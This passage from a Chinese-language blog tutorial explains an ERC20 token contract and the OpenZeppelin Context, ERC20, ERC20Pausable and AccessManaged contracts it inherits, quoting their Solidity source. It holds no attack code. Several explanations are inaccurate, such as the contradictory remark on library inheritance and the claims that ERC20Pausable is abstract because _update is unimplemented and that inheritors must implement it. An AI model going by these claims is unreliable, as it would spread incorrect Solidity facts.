<li><strong>从左到右的继承顺序</strong>：如上所述，继承顺序是从左到右的，这意味着基类在派生类之前被继承。</li>
<li><strong>构造函数的调用</strong>：在派生类的构造函数中，必须显式地调用所有基类的构造函数。调用顺序必须遵循继承顺序，即从左到右。</li>
<li><strong>函数覆盖</strong>：如果基类和派生类中有同名的函数，那么派生类的函数会覆盖基类的函数。在调用这些函数时，会优先调用派生类的函数。</li>
<li><strong>库的使用</strong>：如果合约继承了一个库，那么库的函数会被覆盖。这是因为库的函数是内部函数，不能被覆盖。</li>
</ol>
<h3 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">constructor(address initialAuthority)</span><br><span class="line">    ERC20(&quot;BobToken&quot;, &quot;BBK&quot;)</span><br><span class="line">    AccessManaged(initialAuthority)</span><br><span class="line">    ERC20Permit(&quot;BobToken&quot;)</span><br><span class="line">&#123;&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>initialAuthority</code>: 初始化合约的管理权限地址。</li>
<li>构造函数中调用了多个基类的构造函数，传递了必要的参数，如代币名称、符号、初始权限地址等。ERC20、AccessManaged和ERC20Permit的构造函数被显式地调用，并且按照继承顺序从左到右调用。</li>
</ul>
<h3 id="主要函数"><a href="#主要函数" class="headerlink" title="主要函数"></a>主要函数</h3><ol>
<li><strong>pause()</strong>: 暂停代币的转账操作。只有通过<code>AccessManaged</code>接口授权的地址才能调用。</li>
<li><strong>unpause()</strong>: 恢复代币的转账操作。同样，只有授权的地址才能调用。</li>
<li><strong>mint(address to, uint256 amount)</strong>: 允许授权地址铸造新的代币，并将其发送给指定的地址。这通常用于代币发行。</li>
</ol>
<h3 id="内部函数"><a href="#内部函数" class="headerlink" title="内部函数"></a>内部函数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _update(address from, address to, uint256 value)</span><br><span class="line">    internal</span><br><span class="line">    override(ERC20, ERC20Pausable)</span><br><span class="line">&#123;</span><br><span class="line">    super._update(from, to, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>_update</code>函数是一个内部函数，用于更新代币的余额。它重写了<code>ERC20</code>和<code>ERC20Pausable</code>中的同名函数，并在内部调用了<code>super._update</code>，确保了在更新余额时考虑了暂停状态。</p>
<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ul>
<li><strong>访问控制</strong>: <code>AccessManaged</code>接口确保了只有授权的地址才能执行关键操作，如暂停、铸造等。</li>
<li><strong>暂停功能</strong>: <code>ERC20Pausable</code>接口提供了暂停和恢复转账操作的功能，这在处理紧急情况时非常有用。</li>
<li><strong>EIP-2612 Permit标准</strong>: 通过实现<code>ERC20Permit</code>接口，用户可以授权第三方代币转移，而无需直接调用转账函数，这提高了安全性。</li>
</ul>
<p>总的来说，这段代码实现了一个功能丰富的代币合约，结合了多种安全性和管理功能，适用于需要严格控制访问和操作的场景。接下来，我们按照继承顺序逐个来介绍一下。</p>
<h1 id="Context"><a href="#Context" class="headerlink" title="Context"></a>Context</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">// OpenZeppelin Contracts (last updated v5.0.1) (utils/Context.sol)</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.20;</span><br><span class="line"></span><br><span class="line">abstract contract Context &#123;</span><br><span class="line">    function _msgSender() internal view virtual returns (address) &#123;</span><br><span class="line">        return msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function _msgData() internal view virtual returns (bytes calldata) &#123;</span><br><span class="line">        return msg.data;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function _contextSuffixLength() internal view virtual returns (uint256) &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这段代码定义了一个名为<code>Context</code>的抽象合约。这个合约主要用于提供关于当前执行上下文的信息，包括交易的发送者和数据。在处理元交易（meta-transactions）时，发送和支付执行费用的账户可能不是实际的应用程序发送者。</p>
<h3 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h3><ol>
<li><p><strong><code>_msgSender()</code>函数</strong>：这个函数返回当前交易的发送者地址。在大多数情况下，这可以通过<code>msg.sender</code>直接获取，但在处理元交易时，这个值可能不是实际的发送者。因此，这个函数提供了一个抽象层，允许子合约重写它以提供正确的发送者地址。</p>
</li>
<li><p><strong><code>_msgData()</code>函数</strong>：这个函数返回当前交易的输入数据。同样，在大多数情况下，这可以通过<code>msg.data</code>直接获取，但在处理元交易时，这个值可能不是实际的输入数据。因此，这个函数提供了一个抽象层，允许子合约重写它以提供正确的输入数据。</p>
</li>
<li><p><strong><code>_contextSuffixLength()</code>函数</strong>：这个函数返回一个长度值，表示上下文后缀的长度。这个函数在处理元交易时可能有用，但在这个合约中默认返回0，表示没有上下文后缀。</p>
</li>
</ol>
<h3 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h3><p><code>Context</code>合约的主要用途是为那些需要访问当前执行上下文信息的合约提供基础。例如，如果一个合约需要知道是谁发送了交易，或者交易中包含了哪些数据，它可以继承<code>Context</code>合约并使用<code>_msgSender()</code>和<code>_msgData()</code>函数。</p>
<h3 id="注意事项-1"><a href="#注意事项-1" class="headerlink" title="注意事项"></a>注意事项</h3><ul>
<li><strong>继承</strong>：任何需要使用<code>Context</code>合约功能的合约都应该继承它。如果子合约需要提供不同的发送者或数据，它应该重写<code>_msgSender()</code>和<code>_msgData()</code>函数。</li>
<li><strong>元交易</strong>：处理元交易时，发送和支付执行费用的账户可能不是实际的发送者。因此，任何依赖于<code>msg.sender</code>或<code>msg.data</code>的合约都需要能够处理这种情况。</li>
<li><strong>安全性</strong>：在重写<code>_msgSender()</code>和<code>_msgData()</code>函数时，需要确保提供的信息是安全的，以防止潜在的安全漏洞。</li>
</ul>
<h1 id="ERC20"><a href="#ERC20" class="headerlink" title="ERC20"></a>ERC20</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">// OpenZeppelin Contracts (last updated v5.1.0) (token/ERC20/ERC20.sol)</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.20;</span><br><span class="line"></span><br><span class="line">import &#123;IERC20&#125; from &quot;./IERC20.sol&quot;;</span><br><span class="line">import &#123;IERC20Metadata&#125; from &quot;./extensions/IERC20Metadata.sol&quot;;</span><br><span class="line">import &#123;Context&#125; from &quot;../../utils/Context.sol&quot;;</span><br><span class="line">import &#123;IERC20Errors&#125; from &quot;../../interfaces/draft-IERC6093.sol&quot;;</span><br><span class="line"></span><br><span class="line">abstract contract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors &#123;</span><br><span class="line"> ...</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>定义了一个名为 ERC20 的抽象合约，它继承了四个接口：Context、IERC20、IERC20Metadata 和 IERC20Errors。</p>
<ol>
<li>abstract contract ERC20</li>
</ol>
<ul>
<li>abstract contract 表示这是一个抽象合约，不能直接实例化。它通常用于定义接口和共享逻辑，其他合约可以继承它。</li>
<li>ERC20 是合约的名称。</li>
</ul>
<ol start="2">
<li>is Context, IERC20, IERC20Metadata, IERC20Errors</li>
</ol>
<ul>
<li>Context 是一个包含上下文相关函数（如 msg.sender）的接口，通常用于简化合约编写。</li>
<li>IERC20 是 ERC20 标准的接口，定义了 ERC20 代币的基本功能，如 totalSupply、balanceOf、transfer 等。</li>
<li>IERC20Metadata 是 ERC20 标准的扩展接口，定义了代币的元数据，如 name、symbol 和 decimals。</li>
<li>IERC20Errors 是一个自定义的接口，通常用于定义合约中可能出现的错误，如 TransferFailedError、InsufficientBalanceError 等。</li>
</ul>
<h3 id="合约成员"><a href="#合约成员" class="headerlink" title="合约成员"></a>合约成员</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mapping(address account =&gt; uint256) private _balances;</span><br><span class="line"></span><br><span class="line">mapping(address account =&gt; mapping(address spender =&gt; uint256)) private _allowances;</span><br><span class="line"></span><br><span class="line">uint256 private _totalSupply;</span><br><span class="line"></span><br><span class="line">string private _name;</span><br><span class="line">string private _symbol;</span><br></pre></td></tr></table></figure>

<ol>
<li><p><strong>_balances</strong>:</p>
<ul>
<li>这是一个映射（mapping），用于存储每个账户的代币余额。</li>
<li><code>address account</code> 是账户地址，<code>uint256</code> 是该地址对应的代币数量。</li>
<li><code>private</code> 关键字表示这个映射只能在合约内部访问，外部无法直接访问。</li>
<li>这个映射用于跟踪每个账户的代币余额。</li>
</ul>
</li>
<li><p><strong>_allowances</strong>:</p>
<ul>
<li>这是一个嵌套的映射，用于存储每个账户授权给其他账户的代币数量。</li>
<li><code>address account</code> 是账户地址，<code>mapping(address spender =&gt; uint256)</code> 是一个映射，表示该账户授权给其他账户的代币数量。</li>
<li><code>address spender</code> 是被授权的账户地址，<code>uint256</code> 是被授权的代币数量。</li>
<li><code>private</code> 关键字表示这个映射只能在合约内部访问，外部无法直接访问。</li>
<li>这个映射用于跟踪每个账户授权给其他账户的代币数量，通常用于实现代币的转账授权功能。<br>  -</li>
</ul>
</li>
<li><p><strong>_totalSupply</strong>:</p>
<ul>
<li>这是一个无符号整数（uint256），用于存储代币的总供应量。</li>
<li><code>private</code> 关键字表示这个变量只能在合约内部访问，外部无法直接访问。</li>
<li>这个变量用于跟踪代币的总供应量。<br>  -</li>
</ul>
</li>
<li><p><strong>_name</strong>:</p>
<ul>
<li>这是一个字符串变量，用于存储代币的名称。</li>
<li><code>private</code> 关键字表示这个变量只能在合约内部访问，外部无法直接访问。</li>
<li>这个变量用于存储代币的名称，例如 “MyToken”。</li>
</ul>
</li>
<li><p><strong>_symbol</strong>:</p>
<ul>
<li>这是一个字符串变量，用于存储代币的符号。</li>
<li><code>private</code> 关键字表示这个变量只能在合约内部访问，外部无法直接访问。</li>
<li>这个变量用于存储代币的符号，例如 “MTK”。</li>
</ul>
</li>
</ol>
<h3 id="transfer-transferFrom"><a href="#transfer-transferFrom" class="headerlink" title="transfer &amp; transferFrom"></a>transfer &amp; transferFrom</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function transfer(address to, uint256 value) public virtual returns (bool) &#123;</span><br><span class="line">    address owner = _msgSender();</span><br><span class="line">    _transfer(owner, to, value);</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function transferFrom(address from, address to, uint256 value) public virtual returns (bool) &#123;</span><br><span class="line">    address spender = _msgSender();</span><br><span class="line">    _spendAllowance(from, spender, value);</span><br><span class="line">    _transfer(from, to, value);</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function _transfer(address from, address to, uint256 value) internal &#123;</span><br><span class="line">    if (from == address(0)) &#123;</span><br><span class="line">        revert ERC20InvalidSender(address(0));</span><br><span class="line">    &#125;</span><br><span class="line">    if (to == address(0)) &#123;</span><br><span class="line">        revert ERC20InvalidReceiver(address(0));</span><br><span class="line">    &#125;</span><br><span class="line">    _update(from, to, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function _update(address from, address to, uint256 value) internal virtual &#123;</span><br><span class="line">    if (from == address(0)) &#123;</span><br><span class="line">        // Overflow check required: The rest of the code assumes that totalSupply never overflows</span><br><span class="line">        _totalSupply += value;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        uint256 fromBalance = _balances[from];</span><br><span class="line">        if (fromBalance &lt; value) &#123;</span><br><span class="line">            revert ERC20InsufficientBalance(from, fromBalance, value);</span><br><span class="line">        &#125;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            // Overflow not possible: value &lt;= fromBalance &lt;= totalSupply.</span><br><span class="line">            _balances[from] = fromBalance - value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (to == address(0)) &#123;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            // Overflow not possible: value &lt;= totalSupply or value &lt;= fromBalance &lt;= totalSupply.</span><br><span class="line">            _totalSupply -= value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.</span><br><span class="line">            _balances[to] += value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    emit Transfer(from, to, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>所有的转让动作最终都由<code>_transfer</code>方法来完成。</li>
<li><code>_transfer</code>方法中统一判断地址的有效性，使用<code>revert</code>比<code>require</code>更节省gas。</li>
<li><code>ERC20InvalidSender</code>和<code>ERC20InvalidReceiver</code>都来自<code>IERC20Errors</code>接口。</li>
</ul>
<p><strong>_update</strong></p>
<p><code>_update</code> 为内部虚函数，用于更新代币合约中的余额和总供应量。它主要用于处理代币的转移操作，确保在转移过程中不会发生溢出或不足的情况。</p>
<ol>
<li><p><strong>参数说明</strong>：</p>
<ul>
<li><code>from</code>：代币的发送者地址。</li>
<li><code>to</code>：代币的接收者地址。</li>
<li><code>value</code>：转移的代币数量。</li>
</ul>
</li>
<li><p><strong>更新总供应量</strong>：</p>
<ul>
<li>如果 <code>from</code> 是 <code>address(0)</code>，表示这是一个铸造操作（minting），那么 <code>_totalSupply</code> 将增加 <code>value</code>。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _mint(address account, uint256 value) internal &#123;</span><br><span class="line">    if (account == address(0)) &#123;</span><br><span class="line">        revert ERC20InvalidReceiver(address(0));</span><br><span class="line">    &#125;</span><br><span class="line">    _update(address(0), account, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>如果 <code>from</code> 不是 <code>address(0)</code>，表示这是一个转移操作（transfer），那么首先检查 <code>from</code> 的余额是否足够，如果足够，则从 <code>from</code> 的余额中减去 <code>value</code>。</li>
</ul>
</li>
<li><p><strong>更新接收者的余额</strong>：</p>
<ul>
<li>如果 <code>to</code> 是 <code>address(0)</code>，表示这是一个销毁操作（burning），那么 <code>_totalSupply</code> 将减少 <code>value</code>。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _burn(address account, uint256 value) internal &#123;</span><br><span class="line">    if (account == address(0)) &#123;</span><br><span class="line">        revert ERC20InvalidSender(address(0));</span><br><span class="line">    &#125;</span><br><span class="line">    _update(account, address(0), value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>如果 <code>to</code> 不是 <code>address(0)</code>，表示这是一个转移操作，那么将 <code>value</code> 加到 <code>to</code> 的余额中。</li>
</ul>
</li>
<li><p><strong>防止溢出</strong>：</p>
<ul>
<li>使用 <code>unchecked</code> 关键字来处理可能的溢出情况，因为代码逻辑已经确保了不会发生溢出。</li>
<li>使用 <code>unchecked</code> 可以节省gas</li>
</ul>
</li>
<li><p><strong>触发事件</strong>：</p>
<ul>
<li>最后，通过 <code>emit Transfer(from, to, value);</code> 触发一个 <code>Transfer</code> 事件，记录这次转移操作。</li>
</ul>
</li>
</ol>
<h3 id="approve"><a href="#approve" class="headerlink" title="approve"></a>approve</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function transferFrom(address from, address to, uint256 value) public virtual returns (bool) &#123;</span><br><span class="line">    address spender = _msgSender();</span><br><span class="line">    _spendAllowance(from, spender, value);</span><br><span class="line">    _transfer(from, to, value);</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function _approve(address owner, address spender, uint256 value) internal &#123;</span><br><span class="line">    _approve(owner, spender, value, true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual &#123;</span><br><span class="line">    if (owner == address(0)) &#123;</span><br><span class="line">        revert ERC20InvalidApprover(address(0));</span><br><span class="line">    &#125;</span><br><span class="line">    if (spender == address(0)) &#123;</span><br><span class="line">        revert ERC20InvalidSpender(address(0));</span><br><span class="line">    &#125;</span><br><span class="line">    _allowances[owner][spender] = value;</span><br><span class="line">    if (emitEvent) &#123;</span><br><span class="line">        emit Approval(owner, spender, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function _spendAllowance(address owner, address spender, uint256 value) internal virtual &#123;</span><br><span class="line">    uint256 currentAllowance = allowance(owner, spender);</span><br><span class="line">    if (currentAllowance != type(uint256).max) &#123;</span><br><span class="line">        if (currentAllowance &lt; value) &#123;</span><br><span class="line">            revert ERC20InsufficientAllowance(spender, currentAllowance, value);</span><br><span class="line">        &#125;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            _approve(owner, spender, currentAllowance - value, false);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong><code>_approve</code>函数</strong></p>
<p><code>_approve</code>函数用于更新一个账户对另一个账户的授权额度。如果<code>emitEvent</code>参数为<code>true</code>，还会触发一个<code>Approval</code>事件。</p>
<pre><code>- `owner`：授权额度所有者的地址。
- `spender`：被授权的账户地址。
- `value`：授权的额度。
- `emitEvent`：一个布尔值，决定是否触发`Approval`事件。
</code></pre>
<p><strong>流程</strong></p>
<ol>
<li>首先检查<code>owner</code>和<code>spender</code>是否为<code>address(0)</code>，如果是，则抛出异常<code>ERC20InvalidApprover</code>或<code>ERC20InvalidSpender</code>。</li>
<li>更新<code>_allowances</code>映射，将<code>owner</code>对<code>spender</code>的授权额度设置为<code>value</code>。</li>
<li>如果<code>emitEvent</code>为<code>true</code>，则触发<code>Approval</code>事件。</li>
</ol>
<p><strong><code>_spendAllowance</code>函数</strong></p>
<p><code>_spendAllowance</code>函数用于消耗<code>owner</code>对<code>spender</code>的授权额度。它不会更新授权额度，除非授权额度是有限的。如果授权额度不足，则会抛出异常。</p>
<pre><code>- `owner`：授权额度所有者的地址。
- `spender`：被授权的账户地址。
- `value`：要消费的额度。
</code></pre>
<p><strong>流程</strong></p>
<ol>
<li>获取<code>owner</code>对<code>spender</code>的当前授权额度。</li>
<li>如果当前授权额度不是无限（即不等于<code>type(uint256).max</code>），则检查当前授权额度是否足够消费<code>value</code>。</li>
<li>如果足够，则更新<code>owner</code>对<code>spender</code>的授权额度，减去<code>value</code>，并触发<code>Approval</code>事件（如果<code>emitEvent</code>为<code>true</code>）。</li>
</ol>
<h3 id="decimals"><a href="#decimals" class="headerlink" title="decimals"></a>decimals</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function decimals() public view virtual returns (uint8) &#123;</span><br><span class="line">    return 18;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>默认值是18， 如果想改变，只能重写<code>decimals()</code>这个方法。这种方法直接返回固定值的相比于使用成员变量存储的方式更省gas。</p>
<h1 id="ERC20Pausable"><a href="#ERC20Pausable" class="headerlink" title="ERC20Pausable"></a>ERC20Pausable</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">// OpenZeppelin Contracts (last updated v5.1.0) (token/ERC20/extensions/ERC20Pausable.sol)</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.20;</span><br><span class="line"></span><br><span class="line">import &#123;ERC20&#125; from &quot;../ERC20.sol&quot;;</span><br><span class="line">import &#123;Pausable&#125; from &quot;../../../utils/Pausable.sol&quot;;</span><br><span class="line"></span><br><span class="line">abstract contract ERC20Pausable is ERC20, Pausable &#123;</span><br><span class="line">    /**</span><br><span class="line">     * @dev See &#123;ERC20-_update&#125;.</span><br><span class="line">     *</span><br><span class="line">     * Requirements:</span><br><span class="line">     *</span><br><span class="line">     * - the contract must not be paused.</span><br><span class="line">    */</span><br><span class="line">    function _update(address from, address to, uint256 value) internal virtual override whenNotPaused &#123;</span><br><span class="line">        super._update(from, to, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>ERC20Pausable</code> 是个抽象合约，它继承了 <code>ERC20</code> 和 <code>Pausable</code> 两个合约。<code>ERC20</code> 是一个标准的代币合约接口，而 <code>Pausable</code> 是一个用于暂停合约操作的合约。</p>
<h3 id="实现原理-1"><a href="#实现原理-1" class="headerlink" title="实现原理"></a>实现原理</h3><ol>
<li><p><strong>继承关系</strong>：<code>ERC20Pausable</code> 继承了 <code>ERC20</code> 和 <code>Pausable</code> 合约，这意味着它继承了 <code>ERC20</code> 的所有功能（如代币的创建、转移、余额查询等）以及 <code>Pausable</code> 的功能（如暂停和恢复合约操作）。</p>
</li>
<li><p><strong>抽象合约</strong>：<code>ERC20Pausable</code> 是一个抽象合约，因为它包含了一个未实现的函数 <code>_update</code>。</p>
</li>
<li><p><strong>函数重写</strong>：<code>_update</code> 函数重写了 <code>ERC20</code> 合约中的 <code>_update</code> 函数。这个函数在执行代币转移操作之前，会检查合约是否处于暂停状态。如果合约处于暂停状态，则不允许执行转移操作。</p>
</li>
<li><p><strong><code>whenNotPaused</code> 修饰器</strong>：<code>whenNotPaused</code> 是 <code>Pausable</code> 合约中的一个修饰器，用于确保在调用被修饰的函数时，合约不是暂停状态。如果合约是暂停状态，调用将被 revert（回滚）。</p>
</li>
</ol>
<h3 id="用途-1"><a href="#用途-1" class="headerlink" title="用途"></a>用途</h3><p><code>ERC20Pausable</code> 合约的主要用途是提供一个可暂停的代币合约，允许合约所有者或管理员在紧急情况下暂停代币的转移操作，以防止潜在的滥用或攻击。</p>
<h3 id="注意事项-2"><a href="#注意事项-2" class="headerlink" title="注意事项"></a>注意事项</h3><ol>
<li><p><strong>实现 <code>_update</code> 函数</strong>：任何继承 <code>ERC20Pausable</code> 的合约都必须实现 <code>_update</code> 函数，以确保在执行代币转移操作时能够正确地检查合约是否处于暂停状态。</p>
</li>
<li><p><strong>合约暂停</strong>：合约暂停后，所有与代币转移相关的操作都将被阻止，直到合约被恢复。因此，合约所有者或管理员在暂停合约时应谨慎操作，以避免造成不必要的损失。</p>
</li>
<li><p><strong>安全性</strong>：虽然 <code>ERC20Pausable</code> 合约提供了一种暂停合约的方法，但它并不能防止所有潜在的安全问题。开发者仍需确保合约的其他部分（如访问控制、逻辑错误等）是安全的。</p>
</li>
</ol>
<h1 id="AccessManaged"><a href="#AccessManaged" class="headerlink" title="AccessManaged"></a>AccessManaged</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">// OpenZeppelin Contracts (last updated v5.1.0) (access/manager/AccessManaged.sol)</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.20;</span><br><span class="line"></span><br><span class="line">import &#123;IAuthority&#125; from &quot;./IAuthority.sol&quot;;</span><br><span class="line">import &#123;AuthorityUtils&#125; from &quot;./AuthorityUtils.sol&quot;;</span><br><span class="line">import &#123;IAccessManager&#125; from &quot;./IAccessManager.sol&quot;;</span><br><span class="line">import &#123;IAccessManaged&#125; from &quot;./IAccessManaged.sol&quot;;</span><br><span class="line">import &#123;Context&#125; from &quot;../../utils/Context.sol&quot;;</span><br><span class="line"></span><br><span class="line">abstract contract AccessManaged is Context, IAccessManaged &#123;</span><br><span class="line">    address private _authority;</span><br><span class="line"></span><br><span class="line">    bool private _consumingSchedule;</span><br><span class="line">    constructor(address initialAuthority) &#123;</span><br><span class="line">        _setAuthority(initialAuthority);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier restricted() &#123;</span><br><span class="line">        _checkCanCall(_msgSender(), _msgData());</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /// @inheritdoc IAccessManaged</span><br><span class="line">    function authority() public view virtual returns (address) &#123;</span><br><span class="line">        return _authority;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    /// @inheritdoc IAccessManaged</span><br><span class="line">    function setAuthority(address newAuthority) public virtual &#123;</span><br><span class="line">        address caller = _msgSender();</span><br><span class="line">        if (caller != authority()) &#123;</span><br><span class="line">            revert AccessManagedUnauthorized(caller);</span><br><span class="line">        &#125;</span><br><span class="line">        if (newAuthority.code.length == 0) &#123;</span><br><span class="line">            revert AccessManagedInvalidAuthority(newAuthority);</span><br><span class="line">        &#125;</span><br><span class="line">        _setAuthority(newAuthority);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    /// @inheritdoc IAccessManaged</span><br><span class="line">    function isConsumingScheduledOp() public view returns (bytes4) &#123;</span><br><span class="line">        return _consumingSchedule ? this.isConsumingScheduledOp.selector : bytes4(0);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function _setAuthority(address newAuthority) internal virtual &#123;</span><br><span class="line">        _authority = newAuthority;</span><br><span class="line">        emit AuthorityUpdated(newAuthority);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function _checkCanCall(address caller, bytes calldata data) internal virtual &#123;</span><br><span class="line">        (bool immediate, uint32 delay) = AuthorityUtils.canCallWithDelay(</span><br><span class="line">            authority(),</span><br><span class="line">            caller,</span><br><span class="line">            address(this),</span><br><span class="line">            bytes4(data[0:4])</span><br><span class="line">        );</span><br><span class="line">        if (!immediate) &#123;</span><br><span class="line">            if (delay &gt; 0) &#123;</span><br><span class="line">                _consumingSchedule = true;</span><br><span class="line">                IAccessManager(authority()).consumeScheduledOp(caller, data);</span><br><span class="line">                _consumingSchedule = false;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                revert AccessManagedUnauthorized(caller);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>AccessManaged</code> 是个抽象合约，它继承了 <code>Context</code> 和 <code>IAccessManaged</code> 接口。这个合约的主要目的是管理合约的访问权限，确保只有授权的地址才能调用特定的函数。下面是对代码的详细解释：</p>
<h3 id="合约结构"><a href="#合约结构" class="headerlink" title="合约结构"></a>合约结构</h3><ol>
<li><p><strong>状态变量</strong>：</p>
<ul>
<li><code>_authority</code>：存储当前合约的授权地址。</li>
<li><code>_consumingSchedule</code>：一个布尔值，用于指示是否正在执行预定的操作。</li>
</ul>
</li>
<li><p><strong>构造函数</strong>：</p>
<ul>
<li><code>constructor(address initialAuthority)</code>：初始化合约，设置初始的授权地址。</li>
</ul>
</li>
<li><p><strong>修饰器</strong>：</p>
<ul>
<li><code>modifier restricted()</code>：限制函数的访问，确保只有授权的地址才能调用。这个修饰器通过调用 <code>_checkCanCall</code> 函数来检查调用者是否有权限。</li>
</ul>
</li>
<li><p><strong>接口实现</strong>：</p>
<ul>
<li><code>function authority() public view virtual returns (address)</code>：返回当前的授权地址。</li>
<li><code>function setAuthority(address newAuthority) public virtual</code>：设置新的授权地址。只有当前的授权地址才能调用这个函数。</li>
<li><code>function isConsumingScheduledOp() public view returns (bytes4)</code>：检查合约是否正在执行预定的操作。</li>
</ul>
</li>
<li><p><strong>内部函数</strong>：</p>
<ul>
<li><code>function _setAuthority(address newAuthority) internal virtual</code>：设置新的授权地址。这个函数没有访问限制，允许直接设置新的授权地址。</li>
<li><code>function _checkCanCall(address caller, bytes calldata data) internal virtual</code>：检查调用者是否有权限调用当前函数。如果调用者没有权限，则抛出异常。</li>
</ul>
</li>
</ol>
<h3 id="实现原理-2"><a href="#实现原理-2" class="headerlink" title="实现原理"></a>实现原理</h3><ul>
<li><strong>权限管理</strong>：通过 <code>_authority</code> 状态变量和 <code>restricted</code> 修饰器实现。只有 <code>_authority</code> 指定的地址才能调用被 <code>restricted</code> 修饰的函数。</li>
<li><strong>授权地址的设置</strong>：通过 <code>setAuthority</code> 函数设置新的授权地址，只有当前的授权地址才能调用这个函数。</li>
<li><strong>预定操作</strong>：通过 <code>_consumingSchedule</code> 和 <code>isConsumingScheduledOp</code> 函数管理预定的操作。如果合约正在执行预定的操作，<code>isConsumingScheduledOp</code> 函数会返回一个特定的函数选择器。</li>
</ul>
<h3 id="用途-2"><a href="#用途-2" class="headerlink" title="用途"></a>用途</h3><p>这个合约的主要用途是提供一个框架，用于管理合约的访问权限。通过设置授权地址，可以确保只有授权的地址才能调用合约的特定函数。这对于需要严格控制访问权限的合约非常有用，例如智能合约钱包或权限管理合约。</p>
<h3 id="注意事项-3"><a href="#注意事项-3" class="headerlink" title="注意事项"></a>注意事项</h3><ul>
<li><strong>安全性</strong>：在实现权限管理时，需要特别注意不要在 <code>receive()</code> 或 <code>fallback()</code> 函数上使用 <code>restricted</code> 修饰器，因为这些函数的调用方式可能导致权限检查失败。</li>
<li><strong>权限转移</strong>：通过 <code>setAuthority</code> 函数可以转移合约的权限，但只有当前的授权地址才能执行这个操作，这确保了权限的转移是可控的。</li>
<li><strong>预定操作</strong>：通过 <code>isConsumingScheduledOp</code> 函数可以检查合约是否正在执行预定的操作，这对于需要同步执行多个操作的合约非常有用。</li>
</ul>
